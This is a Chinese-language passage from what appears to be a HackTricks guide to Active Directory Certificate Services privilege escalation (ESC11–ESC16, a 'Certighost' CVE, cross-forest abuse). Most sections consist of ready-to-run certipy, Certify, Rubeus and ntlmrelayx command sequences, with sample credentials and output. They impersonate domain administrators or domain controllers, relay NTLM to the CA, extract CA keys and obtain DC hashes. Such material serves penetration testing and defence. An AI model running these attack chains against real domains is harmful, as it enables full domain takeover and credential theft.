当 `CertificateMappingMethods` 包含 `UPN` 位标志（`0x4`）时，拥有 `GenericWrite` 权限的账户 A 可以 compromise 任何缺少 `userPrincipalName` 属性的账户 B，包括机器账户和内置域管理员 `Administrator`。

这里的目标是 compromise `DC$@corp.local`：首先通过 Shadow Credentials 获取 `Jane` 的 hash，然后利用 `GenericWrite`。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` 的 `userPrincipalName` 随后被设置为 `DC$@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
使用默认的 `User` 模板，以 `Jane` 身份请求客户端身份验证证书。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` 的 `userPrincipalName` 会在此过程后恢复为其原始值。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
通过 Schannel 进行身份验证时，会使用 Certipy 的 `-ldap-shell` 选项，显示身份验证成功，身份为 `u:CORP\DC$`。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
通过 LDAP shell，`set_rbcd` 等命令可启用基于资源的约束委派（RBCD）攻击，从而可能攻陷域控制器。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
此漏洞还会影响任何缺少 `userPrincipalName` 的用户账户，或其 `userPrincipalName` 与 `sAMAccountName` 不匹配的用户账户。默认的 `Administrator@corp.local` 是主要目标，因为它具有较高的 LDAP 权限，并且默认情况下不存在 `userPrincipalName`。

## Relaying NTLM to ICPR - ESC11

### 说明

如果 CA Server 未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，则可以通过 RPC 服务，在不进行签名的情况下执行 NTLM relay attacks。[参考资料](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。

你可以使用 `certipy` 枚举 `Enforce Encryption for Requests` 是否已禁用；如果已禁用，certipy 将显示 `ESC11` Vulnerabilities。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 滥用场景

需要设置一个中继服务器：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意：对于域控制器，必须在 DomainController 中指定 `-template`。

或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket)：
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### 说明

管理员可以将 Certificate Authority 配置为将其存储在外部设备上，例如 "Yubico YubiHSM2"。

如果 USB 设备通过 USB 端口连接到 CA server，或者在 CA server 为 virtual machine 的情况下连接到 USB device server，则需要 authentication key（有时称为 "password"），供 Key Storage Provider 在 YubiHSM 中生成和使用 keys。

此 key/password 以明文形式存储在注册表的 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 中。

参考[此处](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)。

### Abuse Scenario

如果 CA 的 private key 存储在 physical USB device 中，并且你获得了 shell access，则可以恢复该 key。

首先，需要获取 CA certificate（这是 public 的），然后：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最后，使用 certutil `-sign` 命令，利用 CA 证书及其私钥伪造一个新的任意证书。

## OID Group Link Abuse - ESC13

### 说明

`msPKI-Certificate-Policy` 属性允许将 issuance policy 添加到 certificate template 中。负责发布 policies 的 `msPKI-Enterprise-Oid` objects 可以在 PKI OID container 的 Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）中发现。通过该 object 的 `msDS-OIDToGroupLink` 属性，可以将 policy link 到 AD group，使 system 能够将出示该 certificate 的 user 授权为该 group 的 member。[相关参考](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。

换句话说，当 user 拥有 enroll certificate 的 permission，且该 certificate link 到 OID group 时，user 可以继承该 group 的 privileges。

使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 查找 OIDToGroupLink：
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 滥用场景

查找用户权限，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。

如果 `John` 具有对 `VulnerableTemplate` 的 enroll 权限，则该用户可以继承 `VulnerableGroup` 组的权限。

它只需要指定该模板，即可获取一个具有 OIDToGroupLink 权限的证书。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### 说明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 中的说明非常详尽。以下是原文引用。

ESC14 针对的是由“weak explicit certificate mapping”引发的漏洞，主要涉及 Active Directory 用户或计算机账户上的 `altSecurityIdentities` 属性被滥用或配置不安全。此多值属性允许管理员手动将 X.509 certificates 与 AD 账户关联，以用于 authentication。当该属性被填充时，这些 explicit mappings 可以覆盖默认的 certificate mapping 逻辑。默认逻辑通常依赖 certificate 的 SAN 中的 UPN 或 DNS names，或 `szOID_NTDS_CA_SECURITY_EXT` security extension 中嵌入的 SID。

当 `altSecurityIdentities` 属性中用于标识 certificate 的字符串过于宽泛、容易猜测、依赖非唯一的 certificate fields，或使用容易被 spoof 的 certificate components 时，就会形成“weak” mapping。如果 attacker 能够获取或构造一个 certificate，使其 attributes 匹配 privileged account 的此类 weak explicit mapping，那么就可以使用该 certificate 以该账户身份进行 authentication 和 impersonate。

潜在 weak `altSecurityIdentities` mapping strings 的示例包括：

- 仅根据通用的 Subject Common Name (CN) 进行 mapping：例如 `X509:<S>CN=SomeUser`。Attacker 可能能够从安全性较低的来源获取具有该 CN 的 certificate。
- 使用过于通用的 Issuer Distinguished Names (DNs) 或 Subject DNs，而没有通过特定 serial number 或 subject key identifier 等信息进行进一步限定：例如 `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 使用其他 attacker 可能在其合法获取或 forge 的 certificate 中满足的可预测 pattern 或非 cryptographic identifiers（例如 attacker 已 compromise CA，或发现了类似 ESC1 中的 vulnerable template）。

`altSecurityIdentities` 属性支持多种 mapping formats，例如：

- `X509:<I>IssuerDN<S>SubjectDN`（根据完整的 Issuer 和 Subject DN 进行 mapping）
- `X509:<SKI>SubjectKeyIdentifier`（根据 certificate 的 Subject Key Identifier extension value 进行 mapping）
- `X509:<SR>SerialNumberBackedByIssuerDN`（根据 serial number 进行 mapping，并由 Issuer DN 进行隐式限定）——这不是 standard format，通常为 `<I>IssuerDN<SR>SerialNumber`。
- `X509:<RFC822>EmailAddress`（根据 SAN 中的 RFC822 name（通常为 email address）进行 mapping）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（根据 certificate raw public key 的 SHA1 hash 进行 mapping——通常较为 strong）

这些 mapping 的 security 高度取决于 mapping string 中所选 certificate identifiers 的 specificity、uniqueness 和 cryptographic strength。即使 Domain Controllers 已启用 strong certificate binding modes（其主要影响基于 SAN UPN/DNS 和 SID extension 的 implicit mappings），配置不当的 `altSecurityIdentities` entry 仍可能成为直接的 impersonation 路径，因为 mapping logic 本身存在缺陷或过于宽松。
### Abuse Scenario

ESC14 针对 Active Directory (AD) 中的 **explicit certificate mappings**，具体来说是 `altSecurityIdentities` 属性。如果该属性已被设置（无论是有意设置还是配置错误），attacker 就可以通过提供与 mapping 匹配的 certificates 来 impersonate 账户。

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**前提条件**：Attacker 对目标账户的 `altSecurityIdentities` 属性具有 write permissions，或具有以下 target AD object permissions 之一，可以授予自身该权限：
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*。
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **前提条件**：Target 在 altSecurityIdentities 中具有 weak X509RFC822 mapping。Attacker 可以将 victim 的 mail attribute 设置为匹配 target 的 X509RFC822 name，然后以 victim 身份 enroll 一个 certificate，并使用该 certificate 以 target 身份进行 authentication。
#### Scenario C: Target Has X509IssuerSubject Mapping

- **前提条件**：Target 在 `altSecurityIdentities` 中具有 weak X509IssuerSubject explicit mapping。Attacker 可以将 victim principal 的 `cn` 或 `dNSHostName` attribute 设置为匹配 target 的 X509IssuerSubject mapping 的 subject。然后，attacker 可以以 victim 身份 enroll 一个 certificate，并使用该 certificate 以 target 身份进行 authentication。
#### Scenario D: Target Has X509SubjectOnly Mapping

- **前提条件**：Target 在 `altSecurityIdentities` 中具有 weak X509SubjectOnly explicit mapping。Attacker 可以将 victim principal 的 `cn` 或 `dNSHostName` attribute 设置为匹配 target 的 X509SubjectOnly mapping 的 subject。然后，attacker 可以以 victim 身份 enroll 一个 certificate，并使用该 certificate 以 target 身份进行 authentication。
### 具体操作
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
保存并转换证书
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
使用证书进行身份验证
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
清理（可选）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
对于各种攻击场景中的更具体攻击方法，请参考以下内容：[adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。

## EKUwu Application Policies（CVE-2024-49019）- ESC15

### 说明

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc 中的描述非常详尽。以下是原文摘录。

使用内置的默认版本 1 certificate templates，攻击者可以构造 CSR，使其包含优先级高于模板中已配置 Extended Key Usage 属性的 application policies。唯一的要求是具备 enrollment 权限；利用 **_WebServer_** template，可以生成 client authentication、certificate request agent 以及 codesigning certificates。

### 利用

以下内容引用自 [此链接]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)，点击查看更详细的使用方法。


如果 CA 未打补丁，Certipy 的 `find` 命令可以帮助识别可能容易受到 ESC15 攻击的 V1 templates。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### 场景 A：通过 Schannel 直接冒充

**步骤 1：请求证书，注入“Client Authentication”Application Policy 和目标 UPN。** 攻击者 `attacker@corp.local` 使用“WebServer”V1 模板（允许申请者提供 subject），以 `administrator@corp.local` 为目标。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`：存在漏洞的 V1 模板，启用了“Enrollee supplies subject”。
- `-application-policies 'Client Authentication'`：将 OID `1.3.6.1.5.5.7.3.2` 注入 CSR 的 Application Policies 扩展。
- `-upn 'administrator@corp.local'`：在 SAN 中设置 UPN 以进行 impersonation。

**Step 2：使用获取的证书通过 Schannel（LDAPS）进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: 通过滥用 Enrollment Agent 进行 PKINIT/Kerberos Impersonation

**Step 1：从 V1 template 请求证书（带有“Enrollee supplies subject”），注入“Certificate Request Agent” Application Policy。** 此证书用于让攻击者（`attacker@corp.local`）成为 enrollment agent。此处未为攻击者自身身份指定 UPN，因为目标是获得 agent capability。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: 注入 OID `1.3.6.1.4.1.311.20.2.1`。

**步骤 2：使用“agent”证书代表目标特权用户请求证书。** 这是一个类似 ESC3 的步骤，使用步骤 1 中的证书作为 agent certificate。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**步骤 3：使用“on-behalf-of”证书以特权用户身份进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA 上禁用 Security Extension（全局）-ESC16

### 说明

**ESC16（通过缺少 szOID_NTDS_CA_SECURITY_EXT Extension 提权）**指的是：如果 AD CS 的配置未强制要求在所有 certificates 中包含 **szOID_NTDS_CA_SECURITY_EXT** extension，attacker 就可以利用这一点：

1. 请求一个**不含 SID binding 的 certificate**。

2. 使用该 certificate **以任意 account 身份进行 authentication**，例如 impersonating 高权限 account（如 Domain Administrator）。

你也可以参考这篇 article，了解更详细的原理：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

以下内容引用自 [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)，点击查看更详细的使用方法。

要识别 Active Directory Certificate Services（AD CS）environment 是否容易受到 **ESC16** 攻击，需要
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**步骤 1：读取受害者账户的初始 UPN（可选 - 用于恢复）。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**步骤 2：将受害者账户的 UPN 更新为目标管理员的 `sAMAccountName`。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**步骤 3：（如有需要）获取“victim”账户的凭据（例如通过 Shadow Credentials）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**步骤 4：从 _any suitable client authentication template_（例如“User”）向存在 ESC16 漏洞的 CA 请求证书，作为“victim”用户。**由于该 CA 存在 ESC16 漏洞，无论模板对该扩展的具体设置如何，它都会自动从签发的证书中省略 SID security extension。设置 Kerberos credential cache 环境变量（shell command）：
```bash
export KRB5CCNAME=victim.ccache
```
然后请求证书：
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**步骤 5：还原“victim”账户的 UPN。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**步骤 6：以目标管理员身份进行身份验证。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 说明

**Certighost** 利用 **AD CS enrollment chase / callback path**，其中 CA 信任由请求者提供的 request attributes，以解析应放入已签发证书中的身份。在公开 PoC 中，构造的请求包括：

- **`cdc`**：由 attacker 控制的 host/IP，CA 将连接到该地址
- **`rmd`**：要冒充的 **target Domain Controller DNS name**

如果 CA 跟随该 chase，它将通过 **SMB/LSA (`445`)** 和 **LDAP (`389`)** 连接到 attacker。attacker 使用一个**真实的 machine account**（通常通过默认的 **`ms-DS-MachineAccountQuota`** 创建），使 callback session 以有效的 domain principal 进行身份验证，但 rogue services 返回的却是 **target DC** 的身份属性：

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

如果 CA **没有将返回的身份以 cryptographic 方式绑定到经过身份验证的 callback principal**，它就可能为 **Domain Controller** 签发证书，尽管该 session 实际上是以 attacker 控制的 machine account 完成身份验证的。这使该 bug 在概念上不同于 **Certifried**：attacker 并不是重写 `dNSHostName` 等 AD attributes，而是在 CA callback resolution 期间**替换身份数据**。

**有用的前提条件：**

- 低权限的 **domain credentials**
- 能够**创建或复用 computer account**
- CA 能够从网络访问 attacker 控制的 **`389`** 和 **`445`** 端口
- 存在 vulnerable / unpatched 的 CA request path（**2026 年 7 月 14 日**的 Microsoft update 增加了对 **`cdc`** 的 **DC validation** 以及 **resolved-SID comparison**）

生成的 **`.pfx`** 随后可用于 **PKINIT**，生成 **`.ccache`**；在已发布的 PoC 流程中，还能获取 **target DC NT hash**，这通常足以造成**完整的 domain compromise**。

### Abuse

公开 PoC 会自动化执行完整链路：

1. 创建或复用由 attacker 控制的 **machine account**。
2. 在 `389` 和 `445` 上启动 **rogue LDAP and SMB/LSA listeners**。
3. 提交包含由 attacker 控制的 **`cdc`** 和 target **`rmd`** attributes 的 certificate request。
4. 让 CA 以受控 machine account 的身份向 rogue listeners 进行身份验证，但使用 **target DC** attributes 响应 identity lookups。
5. 接收由 CA 签发的 **DC certificate**，然后将其用于 **PKINIT**。
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC 中有用的 runtime flags：

- `--listener <ip>`：显式选择在 `cdc` 中公布的 callback IP
- `--computer-name <NAME$>`：复用现有的 machine account，而不是创建新账户

**Operational notes：**

- PoC 需要 **root**，因为它会绑定 **privileged ports** `389` 和 `445`。
- 成功 exploitation 后，**DC `.pfx`** 和 **Kerberos `.ccache`** 会被写入本地。
- 由于该证书会映射到 **Domain Controller account**，后续操作可以包括 **certificate-based Kerberos auth**、**DCSync**，以及复用恢复出的 **machine NT hash**。

## 使用 Certificates Compromising Forests 的被动语态说明

### Compromised CAs 对 Forest Trusts 的破坏

**cross-forest enrollment** 的配置可以相对简单地完成。resource forest 中的 **root CA certificate** 会由管理员**发布到 account forests**，而 resource forest 中的 **enterprise CA** certificates 会被**添加到每个 account forest 中的 `NTAuthCertificates` 和 AIA containers**。需要明确的是，这种配置会使 resource forest 中的 **CA** 获得对其管理 PKI 的所有其他 forests 的完全控制权。如果该 CA **被攻击者 compromise**，resource forest 和 account forests 中所有用户的 certificates 都可能被其**伪造**，从而破坏 forest 的 security boundary。

### 授予 Foreign Principals 的 Enrollment Privileges

在 multi-forest environments 中，需要特别注意那些**发布 certificate templates** 的 Enterprise CAs，因为这些 templates 可能允许 **Authenticated Users 或 foreign principals**（属于 Enterprise CA 所在 forest 之外的 users/groups）拥有 **enrollment 和 edit rights**。\
当用户跨 trust 完成 authentication 后，AD 会将 **Authenticated Users SID** 添加到用户的 token 中。因此，如果某个 domain 拥有一个允许 **Authenticated Users enrollment rights** 的 Enterprise CA template，则来自不同 forest 的用户可能会对该 template 执行 **enrollment**。同样，如果某个 template 明确向 foreign principal 授予 **enrollment rights**，则会由此创建一个 **cross-forest access-control relationship**，使一个 forest 中的 principal 能够对另一个 forest 中的 template 执行 **enrollment**。

这两种情况都会导致一个 forest 到另一个 forest 的 **attack surface 增加**。certificate template 的设置可能会被攻击者利用，以在 foreign domain 中获得 additional privileges。


## References

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
